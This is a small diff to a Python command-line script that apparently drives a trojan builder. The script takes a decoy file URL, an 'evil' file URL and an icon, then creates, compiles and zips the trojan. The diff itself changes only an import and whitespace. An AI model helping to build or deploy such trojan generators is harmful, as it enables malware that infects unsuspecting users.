@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 import optparse
-from Trojan import *
+from Trojan import Trojan
 
 
 parser = optparse.OptionParser()
@@ -24,5 +24,5 @@ trojan = Trojan(options.front_file_url, options.evil_file_url, options.icon_path
 trojan.create()
 trojan.compile()
 
-if options.zip: 
+if options.zip:
 	trojan.zip(options.out_file_path)
